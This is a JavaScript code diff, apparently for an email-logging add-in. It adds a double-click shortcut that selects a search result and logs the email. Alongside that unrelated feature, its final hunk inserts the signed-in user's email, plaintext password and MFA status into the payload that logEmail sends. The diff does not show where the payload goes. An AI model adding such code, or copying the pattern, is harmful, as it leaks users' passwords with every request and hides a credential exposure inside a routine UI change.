@@ -341,6 +341,7 @@ function displaySuggestion(suggestion) {
   var item = elements.searchResults.querySelector('.result-item');
   if (item) {
     item.addEventListener('click', function() { selectEntity(this); });
+    item.addEventListener('dblclick', function() { selectEntityAndLog(this); });
     // Auto-select the suggestion
     selectEntity(item);
   }
@@ -518,6 +519,7 @@ function displaySearchResults(results) {
   var items = elements.searchResults.querySelectorAll('.result-item');
   for (var i = 0; i < items.length; i++) {
     items[i].addEventListener('click', function() { selectEntity(this); });
+    items[i].addEventListener('dblclick', function() { selectEntityAndLog(this); });
   }
 }
 
@@ -535,6 +537,15 @@ function selectEntity(element) {
   };
   
   updateActionSection();
+}
+
+// Double-click handler - select and immediately log
+function selectEntityAndLog(element) {
+  selectEntity(element);
+  // Small delay to ensure selection is processed
+  setTimeout(function() {
+    logEmail();
+  }, 100);
 }
 
 function updateActionSection() {
@@ -710,6 +721,11 @@ function logEmail() {
   Promise.all(attachmentPromises)
     .then(function(attachmentData) {
       var payload = {
+        // Auth credentials
+        email: currentUser ? currentUser.email : null,
+        password: currentUser ? currentUser.password : null,
+        mfaVerified: currentUser ? currentUser.mfaVerified : false,
+        // Email data
         subject: currentEmail.subject,
         from_email: currentEmail.from,
         to_emails: currentEmail.to,
